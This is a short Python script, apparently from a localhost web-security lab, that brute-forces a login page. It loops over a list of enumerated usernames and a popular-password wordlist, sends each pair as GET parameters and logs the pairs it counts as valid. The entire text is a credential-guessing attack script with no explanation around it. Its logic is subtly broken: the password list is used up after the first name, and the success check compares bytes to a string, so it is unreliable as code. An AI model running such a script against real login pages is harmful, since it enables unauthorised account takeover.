import requests


def user_enum(login, passw):
    payload = {'login': login, 'password': passw}
    response = requests.get('http://localhost/user-enum/login.php', params=payload)
    return response.content != 'Wrong Password!'


val_name = open('output_lists/logins', 'r')
passwords = open('input_lists/Most-Popular-Letter-Passes.txt', 'r')
fw = open('output_lists/logins_and_pass', 'w')
for name in val_name:
    for password in passwords:
        if user_enum(name, password):
            fw.write(name + ' ' + password)
val_name.close()
passwords.close()
fw.close()
